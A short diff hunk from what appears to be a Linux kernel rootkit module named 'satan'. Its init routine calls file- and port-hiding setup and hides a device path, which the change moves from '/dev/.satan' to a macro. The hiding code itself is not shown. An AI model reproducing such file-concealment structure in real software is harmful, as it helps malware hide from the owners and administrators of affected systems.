@@ -19,7 +19,7 @@ static int __init satan_init(void)
         satan_file_init();
         satan_port_init();
 
-        satan_file_hide("/dev/.satan");
+        satan_file_hide(SATAN_CDEV_PATH);
         return 0;
 }
 
